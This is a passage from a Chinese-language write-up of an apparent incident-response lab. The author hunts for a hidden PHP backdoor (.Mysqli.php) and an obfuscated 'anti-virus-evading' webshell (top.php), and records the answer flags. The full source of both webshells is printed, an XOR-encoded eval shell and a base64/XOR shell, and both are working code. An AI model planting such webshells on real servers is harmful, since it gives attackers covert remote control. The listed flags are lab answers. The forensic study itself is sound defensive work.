&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://www.jyshare.com/front-end/703/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319204711.png" alt="Pasted image 20250319204711">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">39392&lt;/span>&lt;span class="nx">de3218c333f794befef07ac9257&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="三flag3">三、flag3&lt;/h2>
&lt;p>&lt;strong>黑客使用的什么工具的shell github地址的md5 flag{md5}&lt;/strong>&lt;br>
那既然说黑客隐藏shell了，那我们肯定需要用到命令ls -la进行查找；&lt;br>
然后发现在挨个查找的过程中发现.Mysqlli.php如果普通的ls查看目录是查不出来的，必须用到ls -la才行，所以它就是隐藏了，我们直接定位一些它的路径，进行MD5加密即可；&lt;br>
这里看到一个Db文件夹，然后进去查发现一个.Mysqli.php文件，cat打开一下发现是一个后门文件。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319205049.png" alt="Pasted image 20250319205049">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">session_start&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">set_time_limit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">error_reporting&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$D&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$K&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$D&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$K&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$D&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$D&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nv">$c&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$D&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$payloadName&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;payload&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;3c6e0b8a9c15224a&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">file_get_contents&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;php://input&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="o">!==&lt;/span>&lt;span class="k">false&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$payloadName&lt;/span>&lt;span class="p">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$payload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$payloadName&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">strpos&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$payload&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;getBasicsInfo&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="k">false&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$payload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$payload&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$payload&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="nx">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">strpos&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;getBasicsInfo&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">!==&lt;/span>&lt;span class="k">false&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$payloadName&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$data&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后pwd一下看一下现在的绝对路径：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">include&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Db&lt;/span>&lt;span class="c1"># pwd
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">include&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Db&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">include&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Db&lt;/span>&lt;span class="c1">#
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后就确定文件的绝对路径：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">include&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">Db&lt;/span>&lt;span class="o">/.&lt;/span>&lt;span class="n">Mysqli&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后进行MD5加密一下;&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319205347.png" alt="Pasted image 20250319205347">&lt;br>
得到flag：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{aebac0e58cd6c5fad1695ee4d1ac1919}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="四flag4">四、flag4&lt;/h2>
&lt;p>&lt;strong>黑客免杀马完整路径 md5 flag{md5}&lt;/strong>&lt;br>
什么是免杀马？&lt;br>
&lt;strong>免杀马&lt;/strong>（免杀病毒或免杀Webshell）是指经过特殊处理和混淆，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。&lt;br>
免杀马通过静态检测是检测不到的，因为在免杀的过程中将webshel的特征值以及特征函数都给去掉了，因为webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录，这里也顺便说一下linux的日志存放在/var/log目录下。&lt;br>
然后我们进入日志看一下日志文件：&lt;br>
进入日志文件夹后发现一个apache2的文件夹，说明网站使用了apache2进行搭建。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319205732.png" alt="Pasted image 20250319205732">&lt;br>
进去后，看一下access.log文件。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319205826.png" alt="Pasted image 20250319205826">&lt;br>
进去后，发现一个top.php执行了phpinfo()；且返回值为200，有点可疑。去找到相对应的文件发现是一个正常的文件来。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319210029.png" alt="Pasted image 20250319210029">&lt;br>
打开文件发现是一个使用base64_decode进行编码混淆了。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="c1"># cd wap
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wap&lt;/span>&lt;span class="c1"># ls
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="nx">template&lt;/span> &lt;span class="nx">top&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wap&lt;/span>&lt;span class="c1"># cat top.php
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;password&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//ERsDHgEUC1hI
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nv">$fun&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">base64_decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;func&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$fun&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$fun&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$fun&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nv">$key&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nv">$i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;a&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;s&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$c&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$a&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nv">$s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;func2&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>查看一下绝对路径：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wap&lt;/span>&lt;span class="c1"># pwd
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wap&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">:/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wap&lt;/span>&lt;span class="c1">#
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>绝对路径：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">wap&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">top&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后进行MD5加密：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250319210635.png" alt="Pasted image 20250319210635">&lt;br>
flag：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">eeff2eabfd9b7a6d26fc1a53d3f7d1de&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="总结">总结&lt;/h1>
&lt;ol>
